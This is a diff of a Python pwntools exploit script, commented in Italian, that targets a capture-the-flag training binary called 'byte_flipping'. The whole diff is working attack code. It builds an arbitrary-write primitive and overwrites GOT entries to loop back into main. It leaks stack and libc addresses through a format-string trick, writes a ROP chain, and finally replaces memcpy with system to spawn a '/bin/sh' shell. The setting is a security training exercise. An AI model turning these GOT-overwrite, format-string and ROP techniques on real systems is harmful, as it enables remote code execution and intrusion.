@@ -15,74 +15,92 @@ def genbin(binary_name):
 		exit(-1)
 
 context.terminal = ['tmux', 'splitw', '-h']
-context.log_level = "error"
+#context.log_level = "error"
 
 
-while True:
-    if args["REMOTE"]:
-        r = remote("bin.training.offdef.it", 4003)
-    else:
-        r = process("./byte_flipping")
-    
+if args["REMOTE"]:
+    r = remote("bin.training.offdef.it", 4003)
+else:
+    r = process("./byte_flipping")
 
-    time.sleep(0.5)
-    r.sendline(b"giulio")       #primo loop
-    time.sleep(0.2)
-    r.sendline(b"0x602050")     #sostituisco exit in got con indirizzo main per riavviare
-    time.sleep(0.2)
-    r.sendline(b"0xc7")
-    time.sleep(0.2)
-    r.sendline(b"0x602051")
-    time.sleep(0.2)
-    r.sendline(b"0x07")
-    time.sleep(0.2)
+# address:  integer of the address you wanna write to
+# data:     bytes object to be written
+def write(address, data):
+    for i in range(len(data)):
+        r.sendline(hex(address + i).encode())
+        time.sleep(0.2)
+        r.sendline(hex(data[i]).encode())
+        time.sleep(0.2)
+
+# writes to an useless address a big value in order to trigger exit function in get_byte check
+def send_big():
     r.sendline(b"e")
     time.sleep(0.2)
-    r.sendline(b"0x100")        # mando un valore grande per eseguire la exit -> jumpa a main
-    time.sleep(0.2)             # ora ogni volta che metto un value grande rinizio da main
-    
+    r.sendline(b"0x100")
+    time.sleep(0.2)    
 
-    r.sendline(b"giulio")       # secondo main
-    time.sleep(0.2)
-    r.sendline(b"0x00602068")   # riscrivo flips per ciclare all'infinito
-    time.sleep(0.2)
-    r.sendline(b"0xff")         # flips = 0xff
-    time.sleep(0.2)
-    r.sendline(b"e")
-    time.sleep(0.2)
-    r.sendline(b"0x100")        # riavvio di nuovo
-    time.sleep(0.2)
-    
 
-    r.sendline(b"/bin/sh\x00")  # terzo main, preparo l'argomento di system dentro a name
-    time.sleep(0.2)
-    r.sendline(b"0x00602038")   # riscrivo il puntatore a memcpy in GOT con quello di system
-    time.sleep(0.2)
-    r.sendline(b"0x60")         # libc-2.35.so, system = 0x050d60 (devo riscrivere gli ultimi 3 byte del puntatore)
-    time.sleep(0.2)             #                          ^
-    r.sendline(b"0x00602039")   #                          |
-    time.sleep(0.2)             # questo nimble sarà casuale, l'exploit funzionerà in media 1/16
-    r.sendline(b"0x0d")         #
-    time.sleep(0.2)             # l'istruzione 0x4008e9 è prima della memcpy ed è LEA RDI, [name] (perfetta per system)
-    r.sendline(b"0x0060203a")
-    time.sleep(0.2)
-    r.sendline(b"0xc5")
-    time.sleep(0.2)
-    r.sendline(b"e")
-    time.sleep(0.2)
-    r.sendline(b"0x100")        # riavvio di nuovo
-    time.sleep(0.2)
-    
-    r.send(b"\x00" * 0x20)  # quarto main, questo valore potrebbe essere qualsiasi cosa, non verrà memorizzato
-    time.sleep(0.2)
-    
-    try:
-        r.recvrepeat(timeout=1)
-        r.sendline(b"whoami")
-        print(r.recvall(timeout=0.2), end="")
-    except:
-        print(r.recvall(timeout=0.2))
-        r.close()
-    finally:
-        print(r.recvall(timeout=0.2))
-        r.close()
+
+flips = 0x602068
+printf_plt = 0x400680
+memcpy_got = 0x602038
+exit_got = 0x602050
+name_bss = 0x6020a0
+pop_rdi_text = 0x400b33
+pop_rsi_r15_text = 0x400b31
+main_text = 0x4007c7
+puts_got = 0x602018
+memcpy_plt = 0x4006a6
+start_text = 0x4006e0
+
+# sostituisco dentro a exit indirizzo a main
+time.sleep(0.5)
+r.send(b"%p\n\x00")
+time.sleep(0.2)
+write(exit_got, bytes([0xc7, 0x07]))
+send_big()
+
+# rimpiazzo flips per scrivere quanto voglio
+r.send(b"%p\n\x00")
+time.sleep(0.2)
+write(flips, bytes([0xff]))
+send_big()
+
+# sostituisco la funzione memcpy con la printf
+r.send(b"%p\n\x00")
+time.sleep(0.2)
+write(memcpy_got, p64(printf_plt))
+send_big()
+
+# printo il leak e risostituisco di nuovo la memcpy
+r.sendline(b"%p\n\x00")
+time.sleep(0.2)
+stack_leak = int(r.recvrepeatS(timeout=0.2).splitlines()[-2], 16)
+print_red(hex(stack_leak))
+sRIP_play = stack_leak - 0x58
+write(memcpy_got, p64(memcpy_plt))
+send_big()
+
+# stampo il contenuto di puts dentro plt (leak_libc) e riavvio totalmente il programma (se riavvio da main crasha.. non si sa perchè)
+# NB le modifiche a flips e al puntatore di exit non sono state modificate
+r.sendline(b"%s\n\00")
+time.sleep(0.2)
+write(sRIP_play, p64(pop_rdi_text) + p64(name_bss) + p64(pop_rsi_r15_text) + p64(puts_got) + p64(0x00) + p64(printf_plt) + p64(start_text))
+time.sleep(0.2)
+r.sendline(b"0")
+time.sleep(0.2)
+libc_leak = int.from_bytes(r.recvrepeat(timeout=0.2).splitlines()[-6], byteorder="little")
+print_red(hex(libc_leak))
+
+libc_system = libc_leak - 0x30170
+
+#sostituisco la memcpy con la system e riavvio
+r.send(b"/bin/sh\x00")
+time.sleep(0.2)
+write(memcpy_got, p64(libc_system))
+send_big()
+
+r.send(b"/bin/sh\x00")
+time.sleep(0.2)
+
+r.interactive()
